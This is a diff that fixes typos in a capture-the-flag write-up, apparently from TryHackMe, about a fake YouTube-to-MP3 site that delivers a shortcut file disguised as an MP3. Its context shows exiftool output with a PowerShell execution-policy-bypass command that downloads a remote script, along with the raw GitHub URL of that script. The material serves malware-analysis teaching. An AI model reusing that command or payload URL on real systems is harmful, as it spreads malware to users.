@@ -6,13 +6,14 @@ This challenge required us to investigate a Youtube to MP3 converter site named 
 <img width="1470" alt="Pasted Graphic 22" src="https://github.com/user-attachments/assets/675c4ff1-a763-49c7-9a25-9c2a7f69099d">
 
 On the website, I entered the YouTube video link provided in the description. I selected the MP3 format.
+
 <img width="1070" alt="Format Selection Protocol" src="https://github.com/user-attachments/assets/3e873ea7-a254-40d9-9c0a-c9b862ab0ce6">
 
 After this, I clicked on the download file option to download the MP3 file. A zip file was downloaded.
 ￼
 <img width="1470" alt="Pasted Graphic 24" src="https://github.com/user-attachments/assets/040e058d-936a-4f36-b7ea-85ae80fa06c6">
 
-I then looked for the zip file in the root directory and clicked on the extract to option in Edit menu to extract the contents of the zip file. Two files named song.mp3 and somg.mp3 were extracted.
+I then looked for the zip file in the root directory and clicked on the extract to option in the Edit menu to extract the contents of the zip file. Two files named song.mp3 and somg.mp3 were extracted.
 
 <img width="1326" alt="Pasted Graphic 25" src="https://github.com/user-attachments/assets/6e3d7248-11f4-4c86-aba5-50a9d6be8ccf">
 
@@ -25,7 +26,7 @@ somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directo
 root@ip-10-10-129-168:~# 
 ```
 
-Then I used the exitfool tool to inspect somg.mp3 file.
+Then I used the exitfool tool to inspect the somg.mp3 file.
 
 ```
 root@ip-10-10-129-168:~# exiftool somg.mp3
@@ -59,7 +60,7 @@ Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient)
 Machine ID                      : win-base-2019
 root@ip-10-10-129-168:~# 
 ```
-I could see the powershell command being used on the above output. I opened the powershelgl script using the given url: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1
+I could see the powershell command being used in the above output. I opened the powershell script using the given url: https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1
 
 ```
 function Print-AsciiArt {
